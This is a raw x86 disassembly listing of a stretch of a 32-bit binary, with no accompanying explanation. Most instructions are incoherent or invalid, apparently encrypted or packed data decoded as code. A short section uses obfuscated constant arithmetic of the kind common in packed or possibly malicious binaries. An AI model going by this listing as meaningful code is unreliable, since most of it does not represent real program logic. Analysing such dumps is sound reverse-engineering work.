  40b718:	jns    0x40b75b
  40b71a:	popf   
  40b71b:	push   ss
  40b71c:	ret    
  40b71d:	stc    
  40b71e:	jnp    0x40b730
  40b720:	pop    ecx
  40b721:	int    0xaa
  40b723:	aad    0xc4
  40b725:	or     ebp,eax
  40b727:	ss enter 0x5221,0x24
  40b72c:	mov    ah,0x8
  40b72e:	pop    edx
  40b72f:	pop    ds
  40b730:	push   edx
  40b731:	xchg   edx,eax
  40b732:	loopne 0x40b6ed
  40b734:	add    al,0xa2
  40b736:	call   0xa263c1ce
  40b73b:	inc    esi
  40b73c:	pop    esp
  40b73d:	xor    esi,DWORD PTR [ebx]
  40b73f:	jmp    0xaf2617cd
  40b744:	loopne 0x40b776
  40b746:	cdq    
  40b747:	xchg   esp,eax
  40b748:	daa    
  40b749:	lahf   
  40b74a:	pop    esp
  40b74b:	fs cdq 
  40b74d:	dec    edx
  40b74e:	mov    ebx,0xd1bc43e0
  40b753:	aas    
  40b754:	dec    esi
  40b755:	xchg   BYTE PTR [esi-0x72],ah
  40b758:	jle    0x40b7d6
  40b75a:	pop    ds
  40b75b:	outs   dx,BYTE PTR ds:[esi]
  40b75c:	mov    bl,0xdd
  40b75e:	rcr    BYTE PTR [edi+0x231dc0e2],cl
  40b764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b765:	sar    cl,1
  40b767:	aam    0xa7
  40b769:	jno    0x40b7ba
  40b76b:	scas   eax,DWORD PTR es:[edi]
  40b76c:	pop    ss
  40b76d:	frstor [eax+0x6d]
  40b770:	std    
  40b771:	xor    DWORD PTR [eax-0x7a],esi
  40b774:	frstor [ebx+0x74]
  40b777:	xchg   ebx,eax
  40b778:	jmp    0x40b7ad
  40b77a:	not    BYTE PTR [ecx+eax*8-0x6d]
  40b77e:	fcomi  st,st(7)
  40b780:	sub    dl,0x84
  40b783:	ins    BYTE PTR es:[edi],dx
  40b784:	pop    ebx
  40b785:	out    0x10,al
  40b787:	dec    edi
  40b788:	mov    WORD PTR [ebx],cs
  40b78a:	mov    WORD PTR ds:0x52eccea,es
  40b790:	push   0x54
  40b792:	scas   al,BYTE PTR es:[edi]
  40b793:	clc    
  40b794:	ret    0xa3da
  40b797:	push   ss
  40b798:	lds    ebx,FWORD PTR [esp+edi*4]
  40b79b:	mov    WORD PTR [edx+0x20],gs
  40b79e:	scas   al,BYTE PTR es:[edi]
  40b79f:	out    0x17,al
  40b7a1:	jo     0x40b79b
  40b7a3:	aad    0xbf
  40b7a5:	enter  0x2b9f,0xaa
  40b7a9:	mov    bl,0xb5
  40b7ab:	sub    BYTE PTR [esi+0x68c2878e],ch
  40b7b1:	pop    es
  40b7b2:	jnp    0x40b759
  40b7b4:	xchg   DWORD PTR [edx+0x70e6e483],eax
  40b7ba:	push   es
  40b7bb:	neg    DWORD PTR [ebx+0x54]
  40b7be:	push   edx
  40b7bf:	cmp    ebx,DWORD PTR [ecx]
  40b7c1:	adc    dh,BYTE PTR [ecx+0x6c]
  40b7c4:	adc    ebp,DWORD PTR [edi-0x37]
  40b7c7:	icebp  
  40b7c8:	test   ch,bh
  40b7ca:	ja     0x40b838
  40b7cc:	fcmovbe st,st(6)
  40b7ce:	mov    ds:0x18e5b869,al
  40b7d3:	cmp    bl,bh
  40b7d5:	lea    esp,[ecx]
  40b7d7:	outs   dx,DWORD PTR ds:[esi]
  40b7d8:	clc    
  40b7d9:	xor    al,ch
  40b7db:	dec    esi
  40b7dc:	(bad)  
  40b7dd:	jno    0x40b7b1
  40b7df:	push   edi
  40b7e0:	cmp    cl,BYTE PTR [edi-0x1d60cb95]
  40b7e6:	jo     0x40b820
  40b7e8:	pop    esp
  40b7e9:	jp     0x40b7dc
  40b7eb:	and    dh,dl
  40b7ed:	add    bl,dl
  40b7ef:	mov    edi,0x9a80a00f
  40b7f4:	scas   al,BYTE PTR es:[edi]
  40b7f5:	xchg   esi,edx
  40b7f7:	stos   DWORD PTR es:[edi],eax
  40b7f8:	jae    0x40b7e6
  40b7fa:	popa   
  40b7fb:	lods   eax,DWORD PTR ds:[esi]
  40b7fc:	lea    ebx,[edx+esi*1-0x1489a349]
  40b803:	or     eax,0xbec47137
  40b808:	and    al,0xf9
  40b80a:	inc    ecx
  40b80b:	pop    ds
  40b80c:	mov    edi,0x4156a48a
  40b811:	push   ebx
  40b812:	sub    edi,edi
  40b814:	test   eax,0x9adff956
  40b819:	push   0x977b84c6
  40b81e:	xchg   edi,eax
  40b81f:	pushf  
  40b820:	push   cs
  40b821:	sbb    ebp,edi
  40b823:	mov    al,ds:0x46e3cfd2
  40b828:	scas   eax,DWORD PTR es:[edi]
  40b829:	xor    esi,DWORD PTR ds:0x9836b1d5
  40b82f:	dec    edx
  40b830:	adc    eax,0x53c68374
  40b835:	push   ds
  40b836:	and    BYTE PTR [esi],dh
  40b838:	ret    
  40b839:	inc    edx
  40b83a:	inc    eax
  40b83b:	push   edx
  40b83c:	mov    esp,0x8c599931
  40b841:	jo     0x40b891
  40b843:	into   
  40b844:	je     0x40b7fc
  40b846:	mov    ebp,DWORD PTR [ebp-0x7019643c]
  40b84c:	das    
  40b84d:	test   BYTE PTR [ebx+0x51],0xa5
  40b851:	push   esi
  40b852:	push   esi
  40b853:	ret    0xda59
  40b856:	mov    ah,0x43
  40b858:	popf   
  40b859:	test   BYTE PTR ds:0x3bbf87e3,bl
  40b85f:	pop    ss
  40b860:	xor    ah,BYTE PTR [edi+esi*1-0x67]
  40b864:	pop    edx
  40b865:	mov    dl,0x50
  40b867:	arpl   dx,ax
  40b869:	xor    BYTE PTR [eax*8+0x5b3521dd],bh
  40b870:	jne    0x40b821
  40b872:	test   BYTE PTR ds:0xf2b177f6,dh
  40b878:	xchg   ebp,eax
  40b879:	iret   
  40b87a:	sbb    DWORD PTR [eax],edi
  40b87c:	push   es
  40b87d:	dec    edx
  40b87e:	pop    ds
  40b87f:	mov    esp,0xa6b8f487
  40b884:	lock add eax,0x789dede4
  40b88a:	and    cl,BYTE PTR [ecx+0x77]
  40b88d:	dec    ebx
  40b88e:	pop    esp
  40b88f:	es jb  0x40b895
  40b892:	add    ebp,edx
  40b894:	xchg   edi,eax
  40b895:	data16 arpl WORD PTR [ebx],si
  40b898:	sbb    esi,DWORD PTR [esi+0x3b]
  40b89b:	data16 gs into 
  40b89e:	ins    BYTE PTR es:[edi],dx
  40b89f:	cmp    al,0x32
  40b8a1:	fucomip st,st(4)
  40b8a3:	push   0xffffffb7
  40b8a5:	lds    edi,FWORD PTR [edx]
  40b8a7:	loop   0x40b91f
  40b8a9:	add    eax,0xf053986d
  40b8ae:	mov    ebx,0x1387239a
  40b8b3:	outs   dx,DWORD PTR ds:[esi]
  40b8b4:	fidiv  DWORD PTR [edi-0x17]
  40b8b7:	idiv   BYTE PTR [edx]
  40b8b9:	pusha  
  40b8ba:	out    dx,eax
  40b8bb:	jno    0x40b877
  40b8bd:	mov    dh,0x41
  40b8bf:	jno    0x40b841
  40b8c1:	aas    
  40b8c2:	daa    
  40b8c3:	mov    dh,BYTE PTR [ebp-0x22]
  40b8c6:	sar    al,cl
  40b8c8:	jns    0x40b856
  40b8ca:	jle    0x40b85b
  40b8cc:	iret   
  40b8cd:	shl    cl,cl
  40b8cf:	push   edx
  40b8d0:	pop    edx
  40b8d1:	cmp    al,0x5f
  40b8d3:	rol    BYTE PTR [esi],cl
  40b8d5:	popa   
  40b8d6:	popa   
  40b8d7:	adc    al,BYTE PTR [eax+esi*8+0x19]
  40b8db:	nop    DWORD PTR ds:0x5686a8d8
  40b8e2:	or     al,0x8a
  40b8e4:	jno    0x40b8f0
  40b8e6:	aas    
  40b8e7:	pop    eax
  40b8e8:	mov    bl,0x47
  40b8ea:	std    
  40b8eb:	idiv   al
  40b8ed:	cmp    eax,DWORD PTR [edi+0x4ec69c22]
  40b8f3:	dec    esp
  40b8f4:	out    0x62,al
  40b8f6:	(bad)  
  40b8f7:	mul    DWORD PTR [eax]
  40b8f9:	cdq    
  40b8fa:	mov    al,0x5d
  40b8fc:	loope  0x40b8fb
  40b8fe:	cdq    
  40b8ff:	out    0x19,al
  40b901:	loope  0x40b8b1
  40b903:	mov    DWORD PTR [ebx+0x3f],0xb51c839d
  40b90a:	aam    0x62
  40b90c:	dec    esi
  40b90d:	push   ebx
  40b90e:	and    eax,0xb92cf05c
  40b913:	fcmovbe st,st(6)
  40b915:	mov    al,ds:0x14a4d696
  40b91a:	push   esp
  40b91b:	jmp    0x7190eaa4
  40b920:	cmp    al,0x14
  40b922:	add    DWORD PTR [edi],ebp
  40b924:	xchg   DWORD PTR [esi+0x48d50add],edx
  40b92a:	std    
  40b92b:	loopne 0x40b903
  40b92d:	dec    ecx
  40b92e:	cdq    
  40b92f:	and    BYTE PTR [eax+0x36a7e360],bl
  40b935:	mov    ch,0xb3
  40b937:	dec    ecx
  40b938:	repz and ebp,DWORD PTR [ebx-0x52a061bc]
  40b93f:	not    DWORD PTR [ecx]
  40b941:	les    ebp,FWORD PTR [esi+0x5d69bfb3]
  40b947:	leave  
  40b948:	or     edi,ecx
  40b94a:	adc    dl,BYTE PTR [edi+0x1d]
  40b94d:	mov    bl,0x16
  40b94f:	mov    ds:0x94f2feb9,eax
  40b954:	clc    
  40b955:	sub    ah,BYTE PTR [edi+0x2f]
  40b958:	cmp    BYTE PTR [esi],ah
  40b95a:	scas   eax,DWORD PTR es:[edi]
  40b95b:	and    DWORD PTR [ecx+ecx*2+0x1ea641ab],eax
  40b962:	das    
  40b963:	sub    BYTE PTR [edx],ch
  40b965:	and    dh,BYTE PTR [ebx-0x19]
  40b968:	cli    
  40b969:	sub    DWORD PTR ds:0x5f5da01e,edx
  40b96f:	xchg   ebp,eax
  40b970:	dec    esp
  40b971:	or     DWORD PTR [edx-0x23],ecx
  40b974:	inc    esi
  40b975:	push   eax
  40b976:	jnp    0x40b967
  40b978:	repz mov ds:0xfb75b786,eax
  40b97e:	mov    cl,0x2
  40b980:	jo     0x40b9d8
  40b982:	jb     0x40b9a0
  40b984:	xchg   ebp,eax
  40b985:	in     al,0xd3
  40b987:	aam    0x55
  40b989:	imul   BYTE PTR [eax-0x6c6a90e5]
  40b98f:	push   ebx
  40b990:	sbb    eax,0xd13cd1ac
  40b995:	jb     0x40b93b
  40b997:	xchg   edi,eax
  40b998:	jmp    0xbe99:0x8df5db04
  40b99f:	xchg   eax,esi
  40b9a1:	(bad)  
  40b9a2:	cmp    esp,DWORD PTR [ebx]
  40b9a4:	jmp    0x40b957
  40b9a6:	mov    cl,0xa2
  40b9a8:	or     dl,BYTE PTR [esi+eax*1-0x1b99b9af]
  40b9af:	fist   DWORD PTR [ebx-0x60]
  40b9b2:	cmc    
  40b9b3:	cmp    ch,cl
  40b9b5:	sbb    BYTE PTR [ebx-0x56],cl
  40b9b8:	and    bl,cl
  40b9ba:	in     al,dx
  40b9bb:	or     esp,edi
  40b9bd:	aas    
  40b9be:	jae    0x40b9b4
  40b9c0:	adc    eax,0x16e7be57
  40b9c5:	jecxz  0x40b9be
  40b9c7:	rcl    dl,cl
  40b9c9:	pop    edi
  40b9ca:	cmp    eax,0xfb4cd716
  40b9cf:	and    al,0x29
  40b9d1:	push   es
  40b9d2:	dec    BYTE PTR [esi-0x18]
  40b9d5:	outs   dx,BYTE PTR ds:[esi]
  40b9d6:	xchg   ebx,eax
  40b9d7:	and    eax,0x47ce3c3
  40b9dc:	mov    cl,0xfc
  40b9de:	sbb    BYTE PTR [ebx+0x8c470],0xe0
  40b9e5:	mov    WORD PTR [esi+edi*4-0x26],gs
  40b9e9:	in     eax,0xa1
  40b9eb:	xchg   ebp,eax
  40b9ec:	and    ah,0x92
  40b9ef:	imul   edx,DWORD PTR [eax+0x52dbbcfa],0x7c
  40b9f6:	lods   al,BYTE PTR ds:[esi]
  40b9f7:	xchg   esp,edx
  40b9f9:	scas   al,BYTE PTR es:[edi]
  40b9fa:	jmp    0x3546:0xb391b00f
  40ba01:	clc    
  40ba02:	sub    eax,DWORD PTR [eax-0x17]
  40ba05:	aaa    
  40ba06:	dec    edi
  40ba07:	out    0x12,al
  40ba09:	push   edx
  40ba0a:	sbb    ebx,DWORD PTR [ecx]
  40ba0c:	fwait
  40ba0d:	adc    al,0x6e
  40ba0f:	imul   esi,DWORD PTR [ebx-0x1a5c96ab],0x38d77bf4
  40ba19:	stos   WORD PTR es:[edi],ax
  40ba1b:	jge    0x40b9d8
  40ba1d:	inc    edx
  40ba1e:	enter  0xe217,0xbf
  40ba22:	mov    bh,bh
  40ba24:	push   cs
  40ba25:	dec    ebx
  40ba26:	pop    esp
  40ba27:	loope  0x40b9b3
  40ba29:	jge    0x40b9f5
  40ba2b:	inc    esp
  40ba2c:	pop    esi
  40ba2d:	imul   edi,DWORD PTR [eax+0x593ba036],0x60f01fce
  40ba37:	push   edx
  40ba38:	jb     0x40baad
  40ba3a:	and    ch,dl
  40ba3c:	jne    0x40ba54
  40ba3e:	xchg   ebp,eax
  40ba3f:	mov    al,ds:0x6852007f
  40ba44:	inc    esp
  40ba45:	pop    esi
  40ba46:	or     edi,DWORD PTR [ebx-0x2c]
  40ba49:	fwait
  40ba4a:	mov    al,al
  40ba4c:	lock test al,0x36
  40ba4f:	leave  
  40ba50:	es stos BYTE PTR es:[edi],al
  40ba52:	cld    
  40ba53:	retf   0x8e7e
  40ba56:	mov    ebx,0xa0f5476a
  40ba5b:	xchg   ecx,eax
  40ba5c:	xchg   edx,eax
  40ba5d:	sar    DWORD PTR [ebx+0x14a5b34a],cl
  40ba63:	pop    ss
  40ba64:	jne    0x40bac5
  40ba66:	xchg   esp,eax
  40ba67:	cmp    DWORD PTR [ebx],0x4775ae10
  40ba6d:	das    
  40ba6e:	aaa    
  40ba6f:	mov    bh,0xae
  40ba71:	push   0x34
  40ba73:	loop   0x40ba91
  40ba75:	cmp    BYTE PTR [ebp+0x5b2cf927],0xdc
  40ba7c:	inc    ebx
  40ba7d:	iret   
  40ba7e:	inc    ecx
  40ba7f:	pop    ds
  40ba80:	mov    ch,0xbf
  40ba82:	xchg   ebx,eax
  40ba83:	nop
  40ba84:	pop    esp
  40ba85:	jg     0x40ba38
  40ba87:	js     0x40ba66
  40ba89:	test   ebp,0x45ba84e6
  40ba8f:	je     0x40ba39
  40ba91:	fdiv   st,st(3)
  40ba93:	xor    ah,BYTE PTR [eax+0x61fc4483]
  40ba99:	xchg   esp,eax
  40ba9a:	push   eax
  40ba9b:	loopne 0x40bb19
  40ba9d:	pop    ebp
  40ba9e:	sbb    al,0xa6
  40baa0:	pusha  
  40baa1:	xchg   edx,eax
  40baa2:	mov    ds:0xe9ea934,al
  40baa7:	das    
  40baa8:	and    al,bh
  40baaa:	inc    ebp
  40baab:	cld    
  40baac:	ret    0x61
  40baaf:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40bab5:	clc    
  40bab6:	add    eax,0x1ca5
  40babb:	or     eax,ecx
  40babd:	mov    ecx,DWORD PTR ds:0x422728
  40bac3:	lea    eax,[eax+ecx*1-0x7eef]
  40baca:	mov    DWORD PTR [ebp-0x5c],eax
  40bacd:	mov    DWORD PTR [ebp-0x4],0x8ea
  40bad4:	mov    DWORD PTR [ebp-0x8],0x5759
  40badb:	mov    eax,DWORD PTR [ebp-0x8]
  40bade:	mov    ecx,DWORD PTR [ebp-0x4]
  40bae1:	and    eax,0x27f6
  40bae6:	xor    eax,ecx
  40bae8:	mov    ecx,DWORD PTR ds:0x42285c
  40baee:	imul   eax,eax,0x18
  40baf1:	xor    eax,0x17970
  40baf6:	lea    eax,[ebp+eax*1-0x54]
  40bafa:	mov    DWORD PTR [eax],ecx
  40bafc:	jmp    0x40bf07
  40bb01:	retf   0xf4e7
  40bb04:	leave  
  40bb05:	hlt    
  40bb06:	fsincos 
  40bb08:	out    0xad,eax
  40bb0a:	and    dl,BYTE PTR [edx-0x62]
  40bb0d:	sbb    DWORD PTR [edx+eax*4-0x31],eax
  40bb11:	outs   dx,BYTE PTR ds:[esi]
  40bb12:	mov    edi,0xc492bebe
  40bb17:	mov    esi,0xd7e3e6be
  40bb1c:	rcl    DWORD PTR [esi+0x1e],0xc3
  40bb20:	stc    
  40bb21:	pop    ds
  40bb22:	nop
  40bb23:	and    DWORD PTR [eax],eax
  40bb25:	pop    ecx
  40bb26:	sub    BYTE PTR [edx],dh
  40bb28:	daa    
  40bb29:	stos   DWORD PTR es:[edi],eax
  40bb2a:	js     0x40bab8
  40bb2c:	sub    eax,0xce41ae95
  40bb31:	(bad)  
  40bb32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb33:	dec    ebp
  40bb34:	dec    esp
  40bb35:	dec    ebx
  40bb36:	pop    ebx
  40bb37:	xchg   ebp,eax
  40bb38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb39:	sub    eax,0x32f3fccb
  40bb3e:	xlat   BYTE PTR ds:[ebx]
  40bb3f:	xchg   esp,eax
  40bb40:	ret    
  40bb41:	sub    BYTE PTR [edx],bh
  40bb43:	jl     0x40bae0
  40bb45:	fidiv  DWORD PTR [ebx-0x2]
  40bb48:	(bad)  
  40bb49:	xor    eax,0x8ec1e262
  40bb4e:	lods   al,BYTE PTR ds:[esi]
  40bb4f:	ret    0x1780
  40bb52:	stc    
  40bb53:	xchg   ebx,eax
  40bb54:	push   esp
  40bb55:	icebp  
  40bb56:	add    DWORD PTR [edx],0x33273e0c
  40bb5c:	fwait
  40bb5d:	adc    ecx,DWORD PTR [eax+0x34]
  40bb60:	dec    esp
  40bb61:	mov    ecx,0x627eaa22
  40bb66:	xchg   ebx,eax
  40bb67:	(bad)  
  40bb68:	jmp    0x40bbe8
  40bb6a:	sbb    BYTE PTR [edx],bl
  40bb6c:	add    DWORD PTR [ebx+edi*8-0x13eb0562],0x5ce647af
  40bb77:	lock icebp 
  40bb79:	cmp    ebp,DWORD PTR [ecx+0x2b]
  40bb7c:	(bad)  
  40bb7d:	or     eax,0xb975abbc
  40bb82:	lods   eax,DWORD PTR ds:[esi]
  40bb83:	add    eax,0x32398b5f
  40bb88:	test   DWORD PTR [eax+eax*4+0x41d55ac0],esp
  40bb8f:	into   
  40bb90:	cdq    
  40bb91:	outs   dx,BYTE PTR ds:[esi]
  40bb92:	jp     0x40bb5e
  40bb94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb95:	push   ss
  40bb96:	add    eax,DWORD PTR [ebx]
  40bb98:	cmc    
  40bb99:	sahf   
  40bb9a:	aaa    
  40bb9b:	mov    esp,0x58691e59
  40bba0:	inc    esp
  40bba1:	imul   edx,esp
  40bba4:	dec    ecx
  40bba5:	es inc eax
  40bba7:	xor    ebp,DWORD PTR [edx]
  40bba9:	nop
  40bbaa:	mov    esi,gs
  40bbac:	inc    ebx
  40bbad:	and    al,0x35
  40bbaf:	pop    edx
  40bbb0:	mov    ds:0xfbe81ebe,eax
  40bbb5:	addr16 xchg ebx,eax
  40bbb7:	xlat   BYTE PTR ds:[ebx]
  40bbb8:	jmp    0x40bc34
  40bbba:	(bad)  
  40bbbb:	dec    ecx
  40bbbc:	fld    DWORD PTR [ebp+0x26]
  40bbbf:	aas    
  40bbc0:	push   ebx
  40bbc1:	pop    eax
  40bbc2:	imul   edi,DWORD PTR [ebx-0x17fcbd2],0xa0e33078
  40bbcc:	arpl   sp,ax
  40bbce:	cmp    eax,0xd0f9176a
  40bbd3:	scas   eax,DWORD PTR es:[edi]
  40bbd4:	mov    ah,0x34
  40bbd6:	lea    esp,[edi+eax*8-0xa]
  40bbda:	adc    cl,BYTE PTR [edi-0x70b8cd39]
  40bbe0:	push   esi
  40bbe1:	jb     0x40bb74
  40bbe3:	push   edi
  40bbe4:	dec    edi
  40bbe5:	outs   dx,BYTE PTR ds:[esi]
  40bbe6:	arpl   sp,di
  40bbe8:	clc    
  40bbe9:	dec    esi
  40bbea:	push   ss
  40bbeb:	enter  0xb279,0xd6
  40bbef:	fdivr  QWORD PTR [edx]
  40bbf1:	js     0x40bb81
  40bbf3:	add    al,0xc3
  40bbf5:	in     al,dx
  40bbf6:	lea    esi,[edi]
  40bbf8:	jp     0x40bc34
  40bbfa:	dec    edx
  40bbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbfc:	inc    edx
  40bbfd:	cmp    edx,DWORD PTR [edx+0x43]
  40bc00:	ds int 0xc6
  40bc03:	pushf  
  40bc04:	adc    edi,DWORD PTR [ebp+ebx*1+0x380e1bfe]
  40bc0b:	dec    ebp
  40bc0c:	rcl    DWORD PTR [edi-0x21],0x1c
  40bc10:	js     0x40bbcb
  40bc12:	lds    edi,FWORD PTR [esi+0x11]
  40bc15:	pop    esi
  40bc16:	cmp    al,0x70
  40bc18:	dec    ebx
  40bc19:	repnz hlt 
  40bc1b:	pushf  
  40bc1c:	cmp    al,0x51
  40bc1e:	jmp    0xf806be12
  40bc23:	sub    eax,0x7052d5d1
  40bc28:	inc    esi
  40bc29:	add    ch,dh
  40bc2b:	es lock scas eax,DWORD PTR es:[edi]
  40bc2e:	repz add al,0x30
  40bc31:	fld    TBYTE PTR [edi]
  40bc33:	addr16 mov dh,0xb2
  40bc36:	push   esi
  40bc37:	jo     0x40bbc2
  40bc39:	mov    bh,ah
  40bc3b:	xchg   esi,eax
  40bc3c:	sti    
  40bc3d:	in     al,dx
  40bc3e:	cmp    eax,0xcad964ed
  40bc43:	(bad)  
  40bc44:	or     al,0x1
  40bc46:	push   ecx
  40bc47:	loope  0x40bc1e
  40bc49:	xchg   esi,eax
  40bc4a:	push   ss
  40bc4b:	push   ebp
  40bc4c:	int3   
  40bc4d:	and    eax,0x66a703fe
  40bc52:	js     0x40bc99
  40bc54:	les    esi,FWORD PTR [ecx+0x52]
  40bc57:	repnz xor al,bh
  40bc5a:	popa   
  40bc5b:	sub    DWORD PTR [ebx+ecx*1],eax
  40bc5e:	dec    edi
  40bc5f:	mov    al,0xde
  40bc61:	ins    DWORD PTR es:[edi],dx
  40bc62:	adc    BYTE PTR [esi+0x5d],dh
  40bc65:	ds pop esp
  40bc67:	sbb    al,dl
  40bc69:	mov    edi,0xe15aa892
  40bc6e:	in     eax,0xf5
  40bc70:	mov    ?,WORD PTR [ebx]
  40bc72:	sbb    al,0x7c
  40bc74:	stc    
  40bc75:	in     al,0x98
  40bc77:	outs   dx,BYTE PTR ds:[esi]
  40bc78:	fmul   DWORD PTR [edx+0x27]
  40bc7b:	sub    bh,BYTE PTR [eax+ebx*8]
  40bc7e:	xchg   esi,eax
  40bc7f:	jp     0x40bcbf
  40bc81:	lahf   
  40bc82:	icebp  
  40bc83:	pop    ds
  40bc84:	icebp  
  40bc85:	lock or al,0x67
  40bc88:	xchg   DWORD PTR [edi+ebp*1+0x3],ebx
  40bc8c:	mov    esp,db4
  40bc8f:	dec    eax
  40bc90:	and    eax,0xcc1d3431
  40bc95:	mov    WORD PTR [ecx],es
  40bc97:	mov    ecx,DWORD PTR [ebx+0x488d4ff0]
  40bc9d:	test   al,0xd7
  40bc9f:	into   
  40bca0:	and    DWORD PTR [edx],0xffffff98
  40bca3:	mov    edi,?
  40bca5:	cmp    eax,0xd6d3340
  40bcaa:	or     DWORD PTR [ecx+0x4d38c340],eax
  40bcb0:	out    dx,al
  40bcb1:	stos   DWORD PTR es:[edi],eax
  40bcb2:	dec    edi
  40bcb3:	mov    esp,0xee870f6a
  40bcb8:	sub    bh,dh
  40bcba:	test   esi,edi
  40bcbc:	ins    DWORD PTR es:[edi],dx
  40bcbd:	or     al,0xd4
  40bcbf:	ds sar dh,0xc4
  40bcc3:	cwde   
  40bcc4:	into   
  40bcc5:	outs   dx,DWORD PTR ds:[esi]
  40bcc6:	scas   eax,DWORD PTR es:[edi]
  40bcc7:	ins    BYTE PTR es:[edi],dx
  40bcc8:	jo     0x40bcfa
  40bcca:	adc    esi,esp
  40bccc:	outs   dx,DWORD PTR ds:[esi]
  40bccd:	lods   al,BYTE PTR ds:[esi]
  40bcce:	fst    QWORD PTR [eax+0x18]
  40bcd1:	push   edi
  40bcd2:	mov    al,0x2c
  40bcd4:	inc    eax
  40bcd5:	xchg   edi,eax
  40bcd6:	gs lock (bad) 
  40bcd9:	adc    eax,0xe4315ad8
  40bcde:	xchg   esp,eax
  40bcdf:	mov    ebp,0x5621dba4
  40bce4:	dec    ebx
  40bce5:	mov    eax,ecx
  40bce7:	cmp    eax,0xa7056347
  40bcec:	cli    
  40bced:	nop
  40bcee:	arpl   WORD PTR [edx],bp
  40bcf0:	(bad)  
  40bcf3:	sub    eax,0xb4b98c93
  40bcf8:	jl     0x40bcb3
  40bcfa:	xor    bl,BYTE PTR [di]
  40bcfd:	out    0x89,al
  40bcff:	xlat   BYTE PTR ds:[ebx]
  40bd00:	fdivr  QWORD PTR [edi+0x4aaeecb3]
  40bd06:	cmp    BYTE PTR [edi-0x5c],dl
  40bd09:	adc    cl,BYTE PTR [eax]
  40bd0b:	out    dx,al
  40bd0c:	jbe    0x40bd2a
  40bd0e:	cmp    eax,0x8885a006
  40bd13:	in     al,0x35
  40bd15:	in     eax,0x4f
  40bd17:	inc    esi
  40bd18:	imul   BYTE PTR [ecx-0x2a]
  40bd1b:	outs   dx,DWORD PTR ds:[esi]
  40bd1c:	mov    edx,0xc4e8648d
  40bd21:	lods   al,BYTE PTR ds:[esi]
  40bd22:	mov    ecx,0x346b5722
  40bd27:	sub    bl,BYTE PTR [edi]
  40bd29:	cli    
  40bd2a:	(bad)  
  40bd2c:	push   0x46
  40bd2e:	push   ebp
  40bd2f:	push   eax
  40bd30:	push   ss
  40bd31:	nop
  40bd32:	aaa    
  40bd33:	je     0x40bcc6
  40bd35:	and    dh,bl
  40bd37:	or     DWORD PTR [esi-0x68],ecx
  40bd3a:	inc    edi
  40bd3b:	out    0xe0,eax
  40bd3d:	push   eax
  40bd3e:	add    BYTE PTR [ecx],ah
  40bd40:	dec    eax
  40bd41:	dec    ebp
  40bd42:	inc    DWORD PTR [edi]
  40bd44:	lods   eax,DWORD PTR ds:[esi]
  40bd45:	mov    ds:0xcda42cd2,al
  40bd4a:	cli    
  40bd4b:	push   ss
  40bd4c:	fwait
  40bd4d:	stos   BYTE PTR es:[edi],al
  40bd4e:	stc    
  40bd4f:	lock call DWORD PTR [edi]
  40bd52:	dec    esi
  40bd53:	xor    al,0x6c
  40bd55:	mov    ds:0x6e9a41d4,al
  40bd5a:	inc    ebx
  40bd5b:	pop    es
  40bd5c:	out    dx,eax
  40bd5d:	data16 or BYTE PTR [ebp+0x5d],al
  40bd61:	cs (bad) 
  40bd63:	mov    eax,0x21b2bf54
  40bd68:	in     eax,0x92
  40bd6a:	sub    bh,cl
  40bd6c:	out    dx,al
  40bd6d:	mov    ah,0x0
  40bd6f:	in     eax,dx
  40bd70:	cmc    
  40bd71:	into   
  40bd72:	iret   
  40bd73:	xchg   BYTE PTR [ecx-0x57],bl
  40bd76:	sbb    BYTE PTR [esi-0x42],bh
  40bd79:	adc    esi,DWORD PTR ds:0xd88c41d6
  40bd7f:	imul   ebx,DWORD PTR [eax],0xffffffa7
  40bd82:	add    edi,esi
  40bd84:	mov    cl,0x88
  40bd86:	or     dl,BYTE PTR [eax-0x5d]
  40bd89:	shl    DWORD PTR [edx+0x370a4c],0xbe
  40bd90:	dec    DWORD PTR [eax]
  40bd92:	xchg   ebx,eax
  40bd93:	mov    ebx,0x38092ce4
  40bd98:	scas   eax,DWORD PTR es:[edi]
  40bd99:	outs   dx,DWORD PTR ds:[esi]
  40bd9a:	xor    bl,BYTE PTR [ebp-0x26715ce5]
  40bda0:	jl     0x40bd6f
  40bda2:	jae    0x40bda6
  40bda4:	pop    esi
  40bda5:	fcmovb st,st(1)
  40bda7:	pop    eax
  40bda8:	push   eax
  40bda9:	es sub al,0x23
  40bdac:	ret    0x4f18
  40bdaf:	sbb    DWORD PTR [edx-0x2d],esi
  40bdb2:	out    0x9d,al
  40bdb4:	add    bl,BYTE PTR [edx+0x64a870bf]
  40bdba:	mov    ebp,0xf10dd634
  40bdbf:	jae    0x40bde4
  40bdc1:	push   es
  40bdc2:	sahf   
  40bdc3:	std    
  40bdc4:	sub    ch,BYTE PTR [ecx-0x7]
  40bdc7:	scas   eax,DWORD PTR es:[edi]
  40bdc8:	mov    bl,0x9e
  40bdca:	out    dx,eax
  40bdcb:	shl    dh,cl
  40bdcd:	jp     0x40bd73
  40bdcf:	mov    esi,0xba615d6c
  40bdd4:	cmc    
  40bdd5:	mov    esp,0xd290c20f
  40bdda:	popa   
  40bddb:	repz test eax,0x6d5f795f
  40bde1:	imul   ecx,DWORD PTR [edi+0xe],0x63
  40bde5:	and    eax,0x326cdd18
  40bdea:	lods   eax,DWORD PTR ds:[esi]
  40bdeb:	aaa    
  40bdec:	and    BYTE PTR [ecx+0x2a40a581],dl
  40bdf2:	enter  0xbec4,0x40
  40bdf6:	cwde   
  40bdf7:	push   edx
  40bdf8:	xchg   DWORD PTR [esi],esi
  40bdfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdfb:	xchg   esi,eax
  40bdfc:	enter  0x65b0,0xcb
  40be00:	adc    dl,ah
  40be02:	cmp    eax,0xf7e323e7
  40be07:	(bad)  
  40be08:	push   ecx
  40be09:	add    BYTE PTR [edi+0x6e7f05cb],bl
  40be0f:	and    ebx,esp
  40be11:	xor    DWORD PTR [edx],ecx
  40be13:	mov    al,0xf9
  40be15:	ds push cs
  40be17:	dec    edx
  40be18:	lea    edi,[esi]
  40be1a:	popa   
  40be1b:	inc    esi
  40be1c:	into   
  40be1d:	mov    ?,WORD PTR [ebx+0x220e050]
  40be23:	lock and eax,0x179035b2
  40be29:	aam    0xa7
  40be2b:	mov    cl,0x17
  40be2d:	pusha  
  40be2e:	sbb    ecx,eax
